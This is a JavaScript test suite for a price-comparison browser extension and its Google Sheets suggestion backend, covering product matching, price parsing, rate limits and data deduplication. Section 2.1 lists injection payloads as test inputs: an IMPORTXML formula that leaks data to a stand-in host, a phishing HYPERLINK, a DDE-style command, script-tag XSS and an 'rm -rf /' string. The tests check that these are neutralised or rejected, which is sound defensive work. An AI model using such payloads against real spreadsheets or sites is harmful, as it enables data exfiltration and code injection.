// SPDX-License-Identifier: MIT
// Project Gina — Ciclo de pruebas extenso:
// 1. Motor de búsqueda y comparador (semejanza, consultas, parseo de tiendas, anti-confusión, unit prices, WAFs)
// 2. Actualización al Drive de recomendación (extensión, offline queue, Code.gs en Sheets, inyecciones, rate limits, robot sync)
"use strict";

const fs = require("fs");
const path = require("path");
const vm = require("vm");
const { JSDOM, VirtualConsole } = require("jsdom");

const ROOT = path.resolve(__dirname, "..");
const EXT = path.join(ROOT, "extension");

// Consola virtual para silenciar advertencias de CSS de JSDOM
const virtualConsole = new VirtualConsole();
virtualConsole.on("error", (err) => {
  const msg = err && (err.message || String(err));
  if (msg && msg.includes("Could not parse CSS stylesheet")) return;
  console.error(err);
});

function createJSDOM(html, opts = {}) {
  return new JSDOM(html, { virtualConsole, ...opts });
}

let pass = 0, total = 0;
const failureDetails = [];

function check(name, ok, detail) {
  total++;
  if (ok) {
    pass++;
    console.log(`OK    ${name}`);
  } else {
    failureDetails.push({ name, detail });
    console.log(`FALLA ${name}${detail ? " → " + detail : ""}`);
  }
}

// Cargar módulos de la extensión en un contexto DOM
const semejanzaCode = fs.readFileSync(path.join(EXT, "src/semejanza.js"), "utf8");
const comparadorCode = fs.readFileSync(path.join(EXT, "src/comparador.js"), "utf8");
const extractorsCode = fs.readFileSync(path.join(EXT, "src/extractors.js"), "utf8");
const matcherCode = fs.readFileSync(path.join(EXT, "src/matcher.js"), "utf8");
const i18nCode = fs.readFileSync(path.join(EXT, "src/i18n.js"), "utf8");

const baseDom = createJSDOM("<!doctype html><html><body></body></html>", { url: "https://www.example.com" });
eval(`(function(globalThis) { ${semejanzaCode} })(baseDom.window);`);
eval(`(function(globalThis) { ${comparadorCode} })(baseDom.window);`);
eval(`(function(globalThis) { ${extractorsCode} })(baseDom.window);`);
eval(`(function(globalThis) { ${matcherCode} })(baseDom.window);`);
eval(`(function(globalThis) { ${i18nCode} })(baseDom.window);`);

const QED = baseDom.window.QED;
const Semejanza = baseDom.window.GINA_SEMEJANZA;

// =========================================================================
// BLOQUE 1: CICLO EXTENSO DE BÚSQUEDA Y COMPARADOR
// =========================================================================
console.log("\n=======================================================");
console.log("=== BLOQUE 1: MOTOR DE BÚSQUEDA Y COMPARADOR EXTENSO ===");
console.log("=======================================================");

// --- 1.1 Generación de consultas con marcas complejas y caracteres especiales ---
console.log("\n--- 1.1 Generación de consultas de búsqueda ---");
{
  const testCasesQuery = [
    {
      prod: { brand: "L'Oréal", title: "L'Oréal Paris Crema Hidratante Revitalift Ácido Hialurónico 50 ml" },
      expectedTokens: ["l oreal", "50 ml"],
      desc: "L'Oréal con apóstrofo y acento"
    },
    {
      prod: { brand: "M&M's", title: "M&M's Chocolate con Leche Bolsa 150 g" },
      expectedTokens: ["m&m's", "150 g"],
      desc: "M&M's con signo ampersand"
    },
    {
      prod: { brand: "3M", title: "3M Cinta de Aislar Eléctrica Temflex 1700 18mm x 18m" },
      expectedTokens: ["3m", "cinta"],
      desc: "3M marca corta de dos caracteres"
    },
    {
      prod: { brand: "Ben & Jerry's", title: "Ben & Jerry's Helado Chocolate Fudge Brownie 473 ml" },
      expectedTokens: ["ben & jerry's", "473 ml"],
      desc: "Ben & Jerry's con ampersand y apóstrofo"
    },
    {
      prod: { brand: "Apple", title: "Apple iPhone 15 Pro Max 256 GB Titanio Natural" },
      expectedTokens: ["apple", "iphone 15", "256 gb"],
      desc: "Apple iPhone 15 con capacidad 256 GB"
    },
    {
      prod: { brand: "Samsung", title: "Smartphone Samsung Galaxy S24 Ultra 512 GB Gris Desbloqueado" },
      expectedTokens: ["samsung", "s24", "512 gb"],
      desc: "Samsung Galaxy S24 con capacidad 512 GB"
    },
    {
      prod: { brand: "Bosch", title: "Rotomartillo Bosch GSB 13 RE 750W 127V Profesional con Maletín" },
      expectedTokens: ["bosch", "gsb 13 re"],
      desc: "Bosch GSB 13 RE conserva espacios originales del modelo"
    },
    {
      prod: { brand: "LG", title: "LG UltraGear Monitor Gamer 27GN800-B 27 Pulgadas QHD 144Hz" },
      expectedTokens: ["lg", "27gn800", "27"],
      desc: "LG Monitor con código de modelo alfanumérico y pulgadas"
    },
    {
      prod: { brand: "Nescafé", title: "Café Soluble Nescafé Clásico 200 g Frasco" },
      expectedTokens: ["nescafe", "200 g"],
      desc: "Nescafé con tilde normalizada"
    },
    {
      prod: { brand: "La Costeña", title: "Chiles Jalapeños La Costeña Picados en Escabeche 220 g" },
      expectedTokens: ["la costena", "220 g"],
      desc: "La Costeña con virgulilla normalizada"
    }
  ];

  for (const tc of testCasesQuery) {
    const rawQ = Semejanza.queryForCompare(tc.prod);
    const normQ = Semejanza.normalizeText(rawQ);
    const missing = tc.expectedTokens.filter((tok) => {
      const normTok = Semejanza.normalizeText(tok);
      return !normQ.includes(normTok) && !rawQ.toLowerCase().includes(tok.toLowerCase());
    });
    check(`Consulta optimizada: ${tc.desc} (${tc.expectedTokens.join(", ")})`,
      missing.length === 0,
      `raw="${rawQ}", norm="${normQ}", faltan: ${missing.join(", ")}`);
  }
}

// --- 1.2 URLs de búsqueda para plataformas soportadas ---
console.log("\n--- 1.2 Generación de URLs de búsqueda por tienda ---");
{
  const stores = [
    { id: "amazon_mx", dominio: "amazon.com.mx", searchUrl: "https://www.amazon.com.mx/s?k=" },
    { id: "mercadolibre_mx", dominio: "mercadolibre.com.mx", searchUrl: "https://listado.mercadolibre.com.mx/" },
    { id: "walmart_mx", dominio: "walmart.com.mx", searchUrl: "https://www.walmart.com.mx/search?q=" },
    { id: "ebay_us", dominio: "ebay.com", searchUrl: "https://www.ebay.com/sch/i.html?_nkw=" }
  ];

  const testProd = { brand: "Sony", model: "WH-1000XM5", title: "Sony Audífonos Inalámbricos WH-1000XM5" };
  const query = Semejanza.queryForCompare(testProd);

  for (const s of stores) {
    const searchTarget = s.searchUrl + encodeURIComponent(query);
    const validUrl = /^https:\/\/[a-z0-9_.-]+\/[^\s]+$/.test(searchTarget);
    check(`URL de búsqueda construida para ${s.dominio}`,
      validUrl && (searchTarget.includes("WH-1000XM5") || searchTarget.includes("wh%201000xm5") || searchTarget.includes("WH%201000XM5")),
      searchTarget);
  }
}

// --- 1.3 Matriz de Confusión Extensa: Casos Idénticos, Variantes y Trampas Negativas ---
console.log("\n--- 1.3 Clasificación de similitud: Coincidencias exactas, variantes y trampas negativas ---");
{
  const confusionPairs = [
    // Coincidencias exactas (same)
    {
      base: { brand: "Nutella", title: "Nutella Crema de Avellanas con Cacao 1 kg" },
      cand: { title: "Ferrero Nutella Tarro 1000g de Crema de Avellana", price: 180 },
      expected: "same",
      desc: "Nutella 1 kg vs 1000g"
    },
    {
      base: { brand: "Coca-Cola", title: "Refresco Coca-Cola Original Lata 355 ml" },
      cand: { title: "Coca Cola Sabor Original 355ml Lata Lean", price: 18 },
      expected: "same",
      desc: "Coca-Cola 355 ml vs 355ml lean"
    },
    {
      base: { brand: "Samsung", title: "Samsung Galaxy S24 Ultra 256 GB Titanium Gray" },
      cand: { title: "Smartphone Samsung S24 Ultra 256GB Gris Titanio Desbloqueado", price: 21999 },
      expected: "same",
      desc: "Samsung S24 Ultra 256 GB exacto"
    },
    {
      base: { brand: "Apple", title: "Apple iPhone 15 128 GB Negro Medianoche" },
      cand: { title: "iPhone 15 128GB Black Apple", price: 17499 },
      expected: "same",
      desc: "Apple iPhone 15 128 GB exacto"
    },
    {
      base: { brand: "Bimbo", title: "Pan Blanco Bimbo Grande 680 g" },
      cand: { title: "Pan de Caja Blanco Bimbo 680g", price: 48 },
      expected: "same",
      desc: "Pan Blanco Bimbo 680 g"
    },

    // Variantes / Presentaciones distintas (similar)
    {
      base: { brand: "Nutella", title: "Nutella Crema de Avellanas con Cacao 1 kg" },
      cand: { title: "Nutella Crema de Avellanas 350 g", price: 75 },
      expected: "similar",
      desc: "Nutella 1 kg vs 350 g (otra presentación)"
    },
    {
      base: { brand: "Nutella", title: "Nutella Crema de Avellanas con Cacao 1 kg" },
      cand: { title: "Nutella 2 Tarros De 1 Kg (Pack de 2)", price: 340 },
      expected: "similar",
      desc: "Nutella 1 kg individual vs 2 x 1 kg (multipack)"
    },
    {
      base: { brand: "Coca-Cola", title: "Refresco Coca-Cola Original Lata 355 ml" },
      cand: { title: "Coca-Cola Sin Azúcar Lata 355 ml", price: 18 },
      expected: "similar",
      desc: "Coca-Cola Original vs Sin Azúcar (variante sabor)"
    },
    {
      base: { brand: "Coca-Cola", title: "Refresco Coca-Cola Original Lata 355 ml" },
      cand: { title: "Coca-Cola Original 355 ml Pack de 12 Latas", price: 210 },
      expected: "similar",
      desc: "Coca-Cola 355 ml individual vs 12 x 355 ml pack"
    },
    {
      base: { brand: "Apple", title: "Apple iPhone 15 128 GB Negro" },
      cand: { title: "Apple iPhone 15 Pro 128 GB Titanio", price: 23999 },
      expected: "similar",
      desc: "iPhone 15 vs iPhone 15 Pro (gama superior)"
    },
    {
      base: { brand: "Apple", title: "Apple iPhone 15 128 GB Negro" },
      cand: { title: "Apple iPhone 15 256 GB Negro", price: 20499 },
      expected: "similar",
      desc: "iPhone 15 128 GB vs 256 GB (capacidad distinta)"
    },
    {
      base: { brand: "Samsung", title: "Samsung Galaxy S23 128 GB Negro" },
      cand: { title: "Samsung Galaxy S23 FE 128 GB Grafito", price: 11999 },
      expected: "similar",
      desc: "Samsung Galaxy S23 vs S23 FE (edición fan)"
    },
    {
      base: { brand: "Bosch", title: "Bosch Rotomartillo GSB 13 RE 750W 127V" },
      cand: { title: "Bosch Rotomartillo GSB 13 RE 750W 220V", price: 1450 },
      expected: "similar",
      desc: "Bosch GSB 13 RE 127V vs 220V (voltaje distinto)"
    },

    // Descarte / Trampas negativas obligatorias (different)
    {
      base: { brand: "LG", title: "LG Monitor Gamer UltraGear 27GN800-B 27 Pulgadas" },
      cand: { title: "Colgate Pasta Dental Total 12 Limpieza Profunda 100 g", price: 45 },
      expected: "different",
      desc: "Colgate con 'LG' en su texto NO coincide con LG"
    },
    {
      base: { brand: "Apple", title: "Apple iPhone 15 128 GB Negro" },
      cand: { title: "Funda de uso rudo para iPhone 15 Transparente", price: 199 },
      expected: "different",
      desc: "Accesorio (funda) no es el teléfono"
    },
    {
      base: { brand: "Samsung", title: "Smartphone Samsung Galaxy S24 Ultra 256 GB" },
      cand: { title: "Mica de cristal templado para Samsung Galaxy S24 Ultra", price: 149 },
      expected: "different",
      desc: "Accesorio (mica) no es el teléfono"
    },
    {
      base: { brand: "Bosch", title: "Bosch Rotomartillo GSB 13 RE 750W 127V" },
      cand: { title: "Accesorio para taladro Bosch: Juego de brocas", price: 289 },
      expected: "different",
      desc: "Accesorio (accesorio para...) no es la herramienta"
    },
    {
      base: { brand: "Bosch", title: "Bosch Rotomartillo GSB 13 RE 750W 127V" },
      cand: { title: "Bosch Taladro de Percusión GSB 16 RE 850W", price: 2100 },
      expected: "different",
      desc: "Bosch GSB 13 RE vs GSB 16 RE (modelo diferente)"
    },
    {
      base: { brand: "Apple", title: "Apple iPhone 15 128 GB Negro" },
      cand: { title: "Apple iPhone 14 128 GB Azul", price: 13999 },
      expected: "different",
      desc: "iPhone 15 vs iPhone 14 (generación distinta)"
    },
    {
      base: { brand: "Samsung", title: "Samsung Galaxy S23 128 GB Negro" },
      cand: { title: "Samsung Galaxy S24 128 GB Amarillo", price: 18999 },
      expected: "different",
      desc: "Samsung S23 vs S24 (generación distinta)"
    },
    {
      base: { brand: "Nupec", title: "Nupec Comida para Felino Adulto Indoor 5 kg" },
      cand: { title: "Nupec Alimento Seco para Felino Kitten 1.5 kg", price: 340 },
      expected: "different",
      desc: "Nupec Adulto vs Nupec Kitten (etapa distinta)"
    },
    {
      base: { brand: "Nupec", title: "Nupec Croquetas Perro Adulto Razas Pequeñas 8 kg" },
      cand: { title: "Nupec Alimento para Perro Cachorro Razas Pequeñas 8 kg", price: 920 },
      expected: "different",
      desc: "Nupec Adulto vs Cachorro (etapa distinta)"
    },
    {
      base: { brand: "Nupec", title: "Nupec Croquetas Perro Adulto Razas Pequeñas 8 kg" },
      cand: { title: "Nupec Alimento para Perro Adulto Razas Grandes 8 kg", price: 880 },
      expected: "different",
      desc: "Nupec Razas Pequeñas vs Razas Grandes (talla distinta)"
    },
    {
      base: { brand: "Nespresso", title: "Cafetera Nespresso Vertuo Pop Máquina de Café Espresso" },
      cand: { title: "Cápsulas de café compatibles con Nespresso Pack 50", price: 420 },
      expected: "different",
      desc: "Consumible (compatibles con...) no es la cafetera"
    }
  ];

  for (const pair of confusionPairs) {
    const res = Semejanza.classifyProductMatch(pair.base, pair.cand);
    check(`Clasificación: ${pair.desc} → predice '${pair.expected}'`,
      res.type === pair.expected,
      `predijo '${res.type}' (${res.label || res.reason || ""})`);
  }
}

// --- 1.4 Parseo de datos JSON-LD complejos y formatos internacionales de precios ---
console.log("\n--- 1.4 Parseo de JSON-LD y formatos internacionales de precios ---");
{
  const htmlComplexJsonLd = `
    <html>
      <head>
        <script type="application/ld+json">
        {
          "@context": "https://schema.org",
          "@type": "Product",
          "name": "Bose QuietComfort 45 Audífonos Bluetooth",
          "image": "https://images.example.com/qc45.jpg",
          "gtin13": "0017817834315",
          "offers": {
            "@type": "Offer",
            "price": "6499.00",
            "priceCurrency": "MXN",
            "availability": "https://schema.org/InStock",
            "url": "https://tienda.example.com/p/bose-qc45"
          },
          "aggregateRating": {
            "@type": "AggregateRating",
            "ratingValue": "4.7",
            "reviewCount": "890"
          }
        }
        </script>
      </head>
      <body></body>
    </html>
  `;

  const items = QED.extractStoreItems(htmlComplexJsonLd, { dominio: "liverpool.com.mx", nombre: "Liverpool" });
  check("JSON-LD: Extrae oferta disponible, precio, moneda y rating agregado",
    items.length === 1 && items[0].price === 6499 && items[0].currency === "MXN" && items[0].rating === 4.7 && items[0].reviewsCount === 890,
    JSON.stringify(items[0]));

  // Formatos de precios internacionales con parsePriceText
  const currencyTests = [
    { raw: "$1,499.00", expectedPrice: 1499 },
    { raw: "1.499,00 €", expectedPrice: 1499 },
    { raw: "£89.99", expectedPrice: 89.99 },
    { raw: "¥ 15,800", expectedPrice: 15800 },
    { raw: "R$ 350,50", expectedPrice: 350.50 },
    { raw: "$49.99", expectedPrice: 49.99 },
    { raw: "1 299,99", expectedPrice: 1299.99 },
    { raw: "US $45.00", expectedPrice: 45 }
  ];

  for (const ct of currencyTests) {
    const parsed = QED.parsePriceText(ct.raw);
    check(`Formato de precio: '${ct.raw}' → ${ct.expectedPrice}`,
      parsed === ct.expectedPrice,
      `obtenido: ${parsed}`);
  }
}

// --- 1.5 Detección de bloqueos y WAFs (Cloudflare, PerimeterX, Amazon Captcha) ---
console.log("\n--- 1.5 Detección de bloqueos y Captchas en comparador ---");
{
  const blockPages = [
    { name: "PerimeterX / HUMAN", html: "<html><head><title>Verifica tu identidad</title></head><body><div id='px-captcha'></div></body></html>" },
    { name: "Cloudflare Turnstile", html: "<html><head><title>Just a moment...</title></head><body><div class='cf-turnstile-wrapper'></div></body></html>" },
    { name: "Amazon Robot Check", html: "<html><body><form method='get' action='/errors/validateCaptcha'><h4>Type the characters you see in this image</h4></form></body></html>" },
    { name: "DataDome Challenge", html: "<html><head><title>Access to this page has been denied</title></head><body><div id='datadome-captcha'></div></body></html>" }
  ];

  for (const bp of blockPages) {
    const isBlocked = QED.isBlockedOrCaptcha(bp.html, 200);
    check(`Detección de bloqueo WAF: ${bp.name}`, isBlocked === true);
  }

  const normalHtml = "<html><head><title>Samsung Galaxy S24 Ultra</title></head><body><h1>Detalle de producto</h1></body></html>";
  check("Página normal de e-commerce no es detectada como bloqueo", QED.isBlockedOrCaptcha(normalHtml, 200) === false);
}

// --- 1.6 Agrupación de variantes y cálculo de precios unitarios ---
console.log("\n--- 1.6 Agrupación por variante, precio unitario e insignia 'Más barato' ---");
{
  const currentProd = {
    brand: "Nutella",
    title: "Nutella 1 kg",
    price: 190,
    currency: "MXN"
  };

  const candidates = [
    { title: "Nutella 1 kg Frasco", price: 165, currency: "MXN", url: "https://amazon.com.mx/dp/1", store: "Amazon" },
    { title: "Nutella 350 g", price: 70, currency: "MXN", url: "https://walmart.com.mx/ip/2", store: "Walmart" },
    { title: "Nutella 2 Tarros de 1 kg", price: 340, currency: "MXN", url: "https://mercadolibre.com.mx/p/3", store: "Mercado Libre" }
  ];

  // Cálculo de precio unitario
  const unitKg = Semejanza.calculateUnitPrice(190, { valor: 1000, unidad: "g" }, 1);
  check("Cálculo de precio unitario: 1000g a $190 → $190.00/kg",
    unitKg && unitKg.unitPrice === 190 && unitKg.unitLabel === "/kg",
    JSON.stringify(unitKg));

  const unitLata = Semejanza.calculateUnitPrice(240, null, 12);
  check("Cálculo de precio unitario multipack: 12 piezas a $240 → $20.00/pza",
    unitLata && unitLata.unitPrice === 20 && unitLata.unitLabel === "/pza",
    JSON.stringify(unitLata));

  // Insignia más barato solo con misma moneda
  const badgeCurrent = { price: 190, currency: "MXN" };
  const candidateLower = { price: 165, currency: "MXN" };
  const candidateHigher = { price: 210, currency: "MXN" };
  const candidateDiffCurrency = { price: 8, currency: "EUR" };

  const isCheaper = candidateLower.currency === badgeCurrent.currency && candidateLower.price < badgeCurrent.price;
  const notCheaper = candidateHigher.currency === badgeCurrent.currency && candidateHigher.price < badgeCurrent.price;
  const diffCurrCheck = candidateDiffCurrency.currency === badgeCurrent.currency && candidateDiffCurrency.price < badgeCurrent.price;

  check("Insignia 'Más barato': otorgada cuando candidato es menor en misma divisa", isCheaper === true);
  check("Insignia 'Más barato': no otorgada cuando candidato es más caro", notCheaper === false);
  check("Insignia 'Más barato': no otorgada si las divisas no coinciden (seguridad)", diffCurrCheck === false);
}

// =========================================================================
// BLOQUE 2: CICLO EXTENSO DE ACTUALIZACIÓN AL DRIVE DE RECOMENDACIÓN
// =========================================================================
console.log("\n=====================================================================");
console.log("=== BLOQUE 2: ACTUALIZACIÓN AL DRIVE DE RECOMENDACIÓN (GOOGLE SHEETS) ===");
console.log("=====================================================================");

// Mock Environment para Google Apps Script (Code.gs)
function createMockAppsScriptEnvironment() {
  const cacheStore = {};
  const propsStore = {
    SHEET_ID: "mock-sheet-drive-id-999",
    ROBOT_TOKEN: "token-secreto-robot-32caracteresminimo"
  };

  const sheetData = [
    ["ID", "Fecha", "Tipo", "Marca", "Tienda", "Producto", "País", "Ext", "Veces", "Estado"]
  ];

  const sheetMock = {
    getLastRow: () => sheetData.length,
    getRange: (startRow, startCol, numRows, numCols) => {
      const nRows = numRows != null ? numRows : 1;
      const nCols = numCols != null ? numCols : 1;
      return {
        getValues: () => {
          const res = [];
          for (let r = 0; r < nRows; r++) {
            const rowIndex = (startRow - 1) + r;
            const row = sheetData[rowIndex] || [];
            const slice = [];
            for (let c = 0; c < nCols; c++) {
              const colIndex = (startCol - 1) + c;
              slice.push(row[colIndex]);
            }
            res.push(slice);
          }
          return res;
        },
        setValue: (val) => {
          if (nRows === 1 && nCols === 1) {
            const rowIndex = startRow - 1;
            const colIndex = startCol - 1;
            if (sheetData[rowIndex]) {
              sheetData[rowIndex][colIndex] = val;
            }
          }
        }
      };
    },
    appendRow: (rowArr) => {
      sheetData.push(rowArr.slice());
    },
    deleteRow: (n) => { sheetData.splice(n - 1, 1); }
  };

  const ssMock = {
    getActiveSheet: () => sheetMock,
    getSheets: () => [sheetMock]
  };

  const lockMock = {
    tryLock: () => true,
    releaseLock: () => {}
  };

  let uuidCounter = 1000;

  global.ContentService = {
    MimeType: { JSON: "application/json" },
    createTextOutput: (str) => ({
      raw: str,
      json: JSON.parse(str),
      setMimeType: () => {}
    })
  };

  global.CacheService = {
    getScriptCache: () => ({
      get: (k) => cacheStore[k] || null,
      put: (k, v) => { cacheStore[k] = String(v); }
    })
  };

  global.PropertiesService = {
    getScriptProperties: () => ({
      getProperty: (k) => propsStore[k] || null,
      setProperty: (k, v) => { propsStore[k] = String(v); }
    })
  };

  global.LockService = {
    getScriptLock: () => lockMock
  };

  global.SpreadsheetApp = {
    openById: (id) => {
      if (id === propsStore.SHEET_ID) return ssMock;
      throw new Error("Sheet not found");
    },
    getActiveSpreadsheet: () => ssMock
  };

  global.Utilities = {
    getUuid: () => "uuid-drive-" + (uuidCounter++)
  };

  delete require.cache[require.resolve("../servicios/sugerencias/Code.gs")];
  const code = require(path.join(__dirname, "..", "servicios", "sugerencias", "Code.gs"));
  return { code, sheetData, cacheStore, propsStore, lockMock };
}

// --- 2.1 Seguridad contra Inyecciones y Cargas Maliciosas en Google Sheets ---
console.log("\n--- 2.1 Seguridad de la Hoja: Prevención de inyección de fórmulas y XSS ---");
{
  const injectionPayloads = [
    { field: "producto", val: '=IMPORTXML("https://evil.example/leak","//a")', desc: "Fórmula =IMPORTXML" },
    { field: "producto", val: '=HYPERLINK("http://phishing.com","Click")', desc: "Fórmula =HYPERLINK" },
    { field: "producto", val: '+1+1', desc: "Comienzo con signo más (+)" },
    { field: "producto", val: '-5*10', desc: "Comienzo con signo menos (-)" },
    { field: "producto", val: '@SUM(A1:A10)', desc: "Comienzo con arroba (@)" },
    { field: "producto", val: '\t=CMD|', desc: "Comienzo con tabulador y comando" }
  ];

  for (let idx = 0; idx < injectionPayloads.length; idx++) {
    const inj = injectionPayloads[idx];
    const { code, sheetData } = createMockAppsScriptEnvironment();
    const payload = {
      v: 1,
      tipo: "marca",
      marca: `Marca Inyeccion ${idx}`,
      tienda: "amazon.com.mx",
      producto: inj.val,
      pais: "MX",
      ext: "3.2.0",
      inst: `11111111-2222-4333-8444-55555555555${idx}`
    };

    const res = code.doPost({ postData: { contents: JSON.stringify(payload) } });
    const lastRow = sheetData[sheetData.length - 1];
    const storedProd = lastRow[5];

    // Se verifica que NO comience con un operador ejecutable de fórmula (=, +, -, @)
    const isFormula = /^[=+\-@\t\r]/.test(storedProd);
    check(`Inyección neutralizada: ${inj.desc} se almacena de forma inerte`,
      res.json.ok === true && !isFormula,
      `stored="${storedProd}"`);
  }

  // Ataques XSS / Markdown / Template Injection que deben ser RECHAZADOS en la marca
  const dangerousBrands = [
    "<script>alert('pwned')</script>",
    "javascript:void(0)",
    "Marca [clic](https://evil.com)",
    "Marca {{7*7}}",
    "Marca ${process.env}",
    "@mencion_peligrosa",
    "Marca `rm -rf /`"
  ];

  for (const badBrand of dangerousBrands) {
    const { code } = createMockAppsScriptEnvironment();
    const payload = {
      v: 1,
      tipo: "marca",
      marca: badBrand,
      tienda: "amazon.com.mx",
      producto: "Prueba XSS",
      pais: "MX",
      ext: "3.2.0",
      inst: "22222222-3333-4444-8555-666666666666"
    };
    const res = code.doPost({ postData: { contents: JSON.stringify(payload) } });
    check(`Rechazo de marca peligrosa: '${badBrand.slice(0, 25)}'`,
      res.json.ok === false && res.json.e === "marca_invalida",
      JSON.stringify(res.json));
  }
}

// --- 2.2 Cuotas, Límites de Tasa y Persistencia ante Expiración de Caché ---
console.log("\n--- 2.2 Cuotas y límites de tasa: 5/hora por inst y 300/día persistente ---");
{
  const { code, propsStore } = createMockAppsScriptEnvironment();
  const testInst = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee";

  // Enviar 5 sugerencias seguidas con la misma instancia
  let lastRes;
  for (let i = 1; i <= 5; i++) {
    lastRes = code.doPost({
      postData: {
        contents: JSON.stringify({
          v: 1,
          tipo: "marca",
          marca: `Marca Test ${i}`,
          tienda: "amazon.com.mx",
          producto: "Prod",
          pais: "MX",
          ext: "3.2.0",
          inst: testInst
        })
      }
    });
  }
  check("Quinta sugerencia en la misma hora es aceptada", lastRes.json.ok === true);

  // La sexta debe rebotar por limite_hora
  const sixthRes = code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1,
        tipo: "marca",
        marca: "Marca Test 6",
        tienda: "amazon.com.mx",
        producto: "Prod",
        pais: "MX",
        ext: "3.2.0",
        inst: testInst
      })
    }
  });
  check("Sexta sugerencia en la misma hora es rechazada con limite_hora",
    sixthRes.json.ok === false && sixthRes.json.e === "limite_hora");

  // Tope diario: PropertiesService sobrevive a la expiración de CacheService
  const today = new Date().toISOString().slice(0, 10);
  propsStore.DAILY = JSON.stringify({ d: today, n: 300 });

  const overLimitRes = code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1,
        tipo: "marca",
        marca: "Marca Tope Diario",
        tienda: "amazon.com.mx",
        producto: "Prod",
        pais: "MX",
        ext: "3.2.0",
        inst: "ffffffff-1111-4222-8333-444444444444"
      })
    }
  });
  check("Tope diario de 300 peticiones en PropertiesService bloquea nuevos envíos",
    overLimitRes.json.ok === false && overLimitRes.json.e === "limite_dia");

  // Al día siguiente se resetea a 1
  propsStore.DAILY = JSON.stringify({ d: "2020-01-01", n: 300 });
  const nextDayRes = code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1,
        tipo: "marca",
        marca: "Marca Día Nuevo",
        tienda: "amazon.com.mx",
        producto: "Prod",
        pais: "MX",
        ext: "3.2.0",
        inst: "ffffffff-1111-4222-8333-444444444444"
      })
    }
  });
  const updatedDaily = JSON.parse(propsStore.DAILY);
  check("Al cambiar de fecha calendario, el tope diario se reinicia a 1 y acepta el envío",
    nextDayRes.json.ok === true && updatedDaily.n === 1 && updatedDaily.d === today);
}

// --- 2.3 Deduplicación en la Hoja de Google: Incremento de 'veces' ---
console.log("\n--- 2.3 Deduplicación en la Hoja: Múltiples instancias incrementan 'veces' ---");
{
  const { code, sheetData } = createMockAppsScriptEnvironment();
  const brandName = "Café Orgánico de la Sierra";

  // 1ra instancia sugiere
  code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1,
        tipo: "marca",
        marca: brandName,
        tienda: "amazon.com.mx",
        producto: "Bolsa 500g",
        pais: "MX",
        ext: "3.2.0",
        inst: "11111111-1111-4111-8111-111111111111"
      })
    }
  });

  // 2da instancia sugiere la misma marca (con variaciones de mayúsculas/espacios)
  code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1,
        tipo: "marca",
        marca: "  café orgánico de la sierra  ",
        tienda: "walmart.com.mx",
        producto: "Bolsa 1kg",
        pais: "MX",
        ext: "3.2.0",
        inst: "22222222-2222-4222-8222-222222222222"
      })
    }
  });

  // 3ra instancia sugiere la misma marca
  code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1,
        tipo: "marca",
        marca: "Café Orgánico De La Sierra",
        tienda: "mercadolibre.com.mx",
        producto: "Café en grano",
        pais: "MX",
        ext: "3.2.0",
        inst: "33333333-3333-4333-8333-333333333333"
      })
    }
  });

  // Solo debe haber 1 fila de datos (fila 1 es encabezado, fila 2 es datos)
  const rows = sheetData.slice(1);
  check("Deduplicación en Hoja: 3 envíos de diferentes usuarios mantienen 1 sola fila con veces=3",
    rows.length === 1 && rows[0][8] === 3 && rows[0][3] === brandName,
    `filas=${rows.length}, veces=${rows[0] ? rows[0][8] : "N/A"}`);
}

// --- 2.4 Ciclo de Vida: Pendiente → Procesado (ack) → Purga (purge) ---
console.log("\n--- 2.4 Ciclo de vida en la Hoja: list → ack → purge ---");
{
  const { code, sheetData, propsStore } = createMockAppsScriptEnvironment();
  const token = propsStore.ROBOT_TOKEN;

  // Insertar 3 sugerencias
  code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1, tipo: "marca", marca: "Marca Alpha", tienda: "amazon.com.mx", producto: "P1", pais: "MX", ext: "3.2.0",
        inst: "aaaaaaaa-1111-4111-8111-111111111111"
      })
    }
  });
  code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1, tipo: "marca", marca: "Marca Beta", tienda: "walmart.com.mx", producto: "P2", pais: "MX", ext: "3.2.0",
        inst: "bbbbbbbb-2222-4222-8222-222222222222"
      })
    }
  });
  code.doPost({
    postData: {
      contents: JSON.stringify({
        v: 1, tipo: "marca", marca: "Marca Gamma", tienda: "ebay.com", producto: "P3", pais: "MX", ext: "3.2.0",
        inst: "cccccccc-3333-4333-8333-333333333333"
      })
    }
  });

  // 1. Robot lista las pendientes (op=list)
  const listRes = code.doGet({ parameter: { token } });
  const pendientes = listRes.json.filas;
  check("doGet lista las 3 marcas pendientes sin filtrar ni perder datos",
    listRes.json.ok === true && pendientes.length === 3);

  // Asegurar que inst NUNCA se expone en el JSON de salida (privacidad)
  const leaksInst = pendientes.some((p) => p.inst !== undefined || "inst" in p);
  check("Privacidad: el listado de la hoja NUNCA expone identificadores de instalación (inst)",
    leaksInst === false);

  // 2. Robot confirma dos marcas como procesadas (Alpha y Gamma)
  const idsToAck = [pendientes[0].id, pendientes[2].id];
  const ackRes = code.doGet({ parameter: { token, op: "ack", ids: idsToAck.join(",") } });
  check("doGet op=ack marca exitosamente los 2 IDs como procesados",
    ackRes.json.ok === true && ackRes.json.procesados === 2);

  // Ahora listar de nuevo solo debe devolver Marca Beta
  const listAfterAck = code.doGet({ parameter: { token } });
  check("Tras op=ack, solo la marca no procesada (Marca Beta) permanece pendiente",
    listAfterAck.json.filas.length === 1 && listAfterAck.json.filas[0].marca === "Marca Beta");

  // 3. Robot ejecuta purga (op=purge)
  const purgeRes = code.doGet({ parameter: { token, op: "purge" } });
  check("doGet op=purge elimina las 2 filas 'procesado' de la hoja",
    purgeRes.json.ok === true && purgeRes.json.borradas === 2);

  // Comprobar que en sheetData solo queda el encabezado + Marca Beta
  const remainingRows = sheetData.slice(1);
  check("Hoja de cálculo en Drive queda limpia: solo encabezado y Marca Beta",
    remainingRows.length === 1 && remainingRows[0][3] === "Marca Beta" && remainingRows[0][9] === "pendiente",
    `filas restantes: ${remainingRows.length}`);
}

// --- 2.5 Resiliencia del Cliente: Cola Offline en la Extensión (background.js) ---
console.log("\n--- 2.5 Resiliencia del cliente: Cola offline y vaciado automático ---");
(async () => {
  const store = {};
  const clone = (x) => (x === undefined ? undefined : JSON.parse(JSON.stringify(x)));

  let networkOnline = false;
  const postedData = [];

